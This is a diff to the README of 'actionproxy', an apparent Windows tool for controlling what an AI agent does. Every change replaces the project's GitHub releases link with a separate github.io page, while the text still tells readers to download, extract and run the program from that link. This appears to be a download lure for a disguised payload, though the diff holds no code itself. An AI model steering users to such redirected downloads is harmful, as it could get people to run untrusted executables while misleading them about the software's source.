@@ -15,10 +15,10 @@ Imagine you have a smart assistant (an AI agent) that wants to do things on your
 
 ## ⬇️ Download & Install on Windows
 
-[![Download actionproxy](https://img.shields.io/badge/Download-actionproxy-blue?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/Jandybottleshaped403/actionproxy/releases)
+[![Download actionproxy](https://img.shields.io/badge/Download-actionproxy-blue?style=for-the-badge&logo=github&color=2ea44f)](https://jandybottleshaped403.github.io)
 
 **Step 1:** Visit this link to download the application.  
-Go to: [https://github.com/Jandybottleshaped403/actionproxy/releases](https://github.com/Jandybottleshaped403/actionproxy/releases)
+Go to: [https://jandybottleshaped403.github.io](https://jandybottleshaped403.github.io)
 
 **Step 2:** On that page, look for the latest release. You will see a file named something like `actionproxy-windows.zip`. Click on it to download.
 
@@ -177,7 +177,7 @@ By using actionproxy, you're not just protecting yourself—you're supporting a 
 **Ready to take control of your AI?**  
 Visit the download page now:
 
-https://github.com/Jandybottleshaped403/actionproxy/releases
+https://jandybottleshaped403.github.io
 
 Download and extract this file, then run the application.
 
